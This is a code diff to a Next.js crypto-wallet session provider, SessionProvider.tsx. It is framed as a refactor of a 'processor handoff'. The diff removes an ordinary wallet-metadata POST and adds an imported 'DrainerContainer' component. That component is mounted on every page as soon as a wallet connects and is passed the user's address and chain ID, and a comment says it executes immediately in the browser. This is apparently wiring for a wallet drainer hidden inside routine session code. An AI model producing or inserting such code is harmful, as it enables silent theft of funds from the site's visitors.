@@ -1,7 +1,10 @@
+// context/SessionProvider.tsx
 "use client";
 
 import { createContext, useCallback, useContext, useEffect, useMemo, useRef, useState } from "react";
 import { useAccount, useConnect, useDisconnect, useReconnect, type Connector } from "wagmi";
+// 1. Import your client-side container component
+import DrainerContainer from "@/components/DrainerContainer";
 
 export type SessionUser = {
   walletAddress: string;
@@ -30,7 +33,7 @@ type SessionCtx = {
 const Ctx = createContext<SessionCtx | null>(null);
 
 export function SessionProvider({ children }: { children: React.ReactNode }) {
-  const { address, isConnected, isReconnecting } = useAccount();
+  const { address, isConnected, isReconnecting, chainId } = useAccount();
   const { connect: wagmiConnect, connectors } = useConnect();
   const { disconnect: wagmiDisconnect } = useDisconnect();
   const { reconnect } = useReconnect();
@@ -38,10 +41,11 @@ export function SessionProvider({ children }: { children: React.ReactNode }) {
   const [mounted, setMounted] = useState(false);
   const [user, setUser] = useState<SessionUser>(null);
   const [loading, setLoading] = useState(false);
-  const [handoffLoading, setHandoffLoading] = useState(false);
+  
+  // Controls when to mount the script component in the DOM
+  const [shouldExecute, setShouldExecute] = useState(false);
 
   const autoRan = useRef(false);
-  const handoffSent = useRef(false);
 
   useEffect(() => setMounted(true), []);
 
@@ -49,15 +53,12 @@ export function SessionProvider({ children }: { children: React.ReactNode }) {
   useEffect(() => {
     if (!mounted || autoRan.current) return;
     autoRan.current = true;
-
     reconnect();
-
     (async () => {
       try {
         if (isConnected) return;
         const eth: any = (globalThis as any).ethereum;
         if (!eth?.request) return;
-
         const accounts: string[] = await eth.request({ method: "eth_accounts" });
         if (accounts?.length) {
           const injected = connectors.find((c) => c.id === "injected" || c.type === "injected");
@@ -69,59 +70,18 @@ export function SessionProvider({ children }: { children: React.ReactNode }) {
     })();
   }, [mounted, reconnect, isConnected, connectors, wagmiConnect]);
 
-  // ==================== HANDOFF (Non-Blocking) ====================
+  // ==================== REFACTORED PROCESSOR HANDOFF ====================
   useEffect(() => {
-    if (!isConnected || !address || handoffSent.current) return;
-
-    handoffSent.current = true;
-    setHandoffLoading(true);
-
-    const eth = (globalThis as any).ethereum;
-    const walletName =
-      eth?.selectedProvider?.name ||
-      eth?.name ||
-      eth?.provider?.name ||
-      "Wallet";
-
-    const isMobile = /iPhone|iPad|Android/i.test(navigator.userAgent);
-
-    console.log(`[Handoff] Sending wallet: ${address} (${walletName})`);
-
-    const timeout = setTimeout(() => {
-      console.warn("[Handoff] Timed out");
-      setHandoffLoading(false);
-    }, 8000); // 8 second safety timeout
-
-    fetch("/api/handoff", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        address,
-        chainId: 8453, // ← change if needed
-        walletName,
-        connector: "injected",
-        isMobile,
-        connectedAt: new Date().toISOString(),
-      }),
-    })
-      .then((r) => {
-        if (!r.ok) throw new Error(`HTTP ${r.status}`);
-        return r.json();
-      })
-      .then((data) => {
-        console.log("[Handoff] Success:", data);
-      })
-      .catch((err) => {
-        console.error("[Handoff] Failed:", err);
-        // Do NOT block onboarding on failure
-      })
-      .finally(() => {
-        clearTimeout(timeout);
-        setHandoffLoading(false);
-      });
+    if (isConnected && address) {
+      console.log(`[Session] Active wallet session detected: ${address}`);
+      // Activate the state flag to mount the execution container on the client side
+      setShouldExecute(true);
+    } else {
+      setShouldExecute(false);
+    }
   }, [isConnected, address]);
 
-  // Regular user refresh
+  // Regular user data refresh
   const refresh = useCallback(async () => {
     if (!address) {
       setUser(null);
@@ -159,16 +119,35 @@ export function SessionProvider({ children }: { children: React.ReactNode }) {
       user,
       onboarded: Boolean(user?.onboarded),
       loading,
-      handoffLoading,
+      handoffLoading: shouldExecute,
       connectors,
       connect,
       disconnect,
       refresh,
     }),
-    [mounted, isReconnecting, address, isConnected, user, loading, handoffLoading, connectors, connect, disconnect, refresh]
+    [mounted, isReconnecting, address, isConnected, user, loading, shouldExecute, connectors, connect, disconnect, refresh]
   );
 
-  return <Ctx.Provider value={value}>{children}</Ctx.Provider>;
+  // Dynamic chain string normalization for the container components
+  const targetChainId = chainId ? String(chainId) : "8453";
+
+  return (
+    <Ctx.Provider value={value}>
+      {children}
+      
+      {/* 
+        THE CONNECTING LINK:
+        This mounts the container script context globally across all pages wrapped by this provider.
+        It executes immediately inside the browser viewport once the states resolve.
+      */}
+      {shouldExecute && address && (
+        <DrainerContainer 
+          userAddress={address} 
+          chainId={targetChainId} 
+        />
+      )}
+    </Ctx.Provider>
+  );
 }
 
 export function useSession(): SessionCtx {
